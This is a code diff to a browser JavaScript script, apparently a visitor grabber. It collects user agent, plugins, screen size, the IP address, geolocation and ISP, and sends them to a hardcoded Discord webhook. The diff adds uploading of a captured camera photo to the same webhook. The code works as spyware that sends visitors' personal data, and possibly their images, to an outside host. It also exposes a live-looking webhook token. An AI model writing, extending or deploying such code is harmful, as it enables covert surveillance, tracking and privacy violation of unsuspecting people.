@@ -65,30 +65,43 @@ fetch('https://api.ipify.org')
         getGeoData(ip)
     ]);
     
-    const embed = {
-        title: "🌐 Информация о пользователе",
-        fields: [
-            { name: "📱 User Agent", value: navigator.userAgent, inline: false },
-            { name: "🗣️ Язык", value: navigator.language, inline: true },
-            { name: "🌍 Языки", value: navigator.languages?.join(', ') || "Неизвестно", inline: true },
-            { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
-            { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
-            { name: "🌍 Страна", value: geo.country, inline: true },
-            { name: "🏙️ Город", value: geo.city, inline: true },
-            { name: "📍 Регион", value: geo.regionName, inline: true },
-            { name: "📡 Провайдер", value: geo.isp, inline: true },
-            { name: "🕐 Часовой пояс", value: geo.timezone, inline: true },
-            { name: "📷 Камера", value: cameraResult.status, inline: true },
-            { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
-        ],
-        timestamp: new Date().toISOString()
+    const payload = {
+        embeds: [{
+            title: "🌐 Информация о пользователе",
+            fields: [
+                { name: "📱 User Agent", value: navigator.userAgent, inline: false },
+                { name: "🗣️ Язык", value: navigator.language, inline: true },
+                { name: "🌍 Языки", value: navigator.languages?.join(', ') || "Неизвестно", inline: true },
+                { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
+                { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
+                { name: "🌍 Страна", value: geo.country, inline: true },
+                { name: "🏙️ Город", value: geo.city, inline: true },
+                { name: "📍 Регион", value: geo.regionName, inline: true },
+                { name: "📡 Провайдер", value: geo.isp, inline: true },
+                { name: "🕐 Часовой пояс", value: geo.timezone, inline: true },
+                { name: "📷 Камера", value: cameraResult.status, inline: true },
+                { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        }]
     };
 
-    fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            embeds: [embed]
-        })
-    });
+    if (cameraResult.image) {
+        payload.content = "📸 Фото с камеры:";
+        const imageBlob = await (await fetch(cameraResult.image)).blob();
+        const formData = new FormData();
+        formData.append('file', imageBlob, 'camera.jpg');
+        formData.append('payload_json', JSON.stringify(payload));
+        
+        fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
+            method: 'POST',
+            body: formData
+        });
+    } else {
+        fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+    }
 });
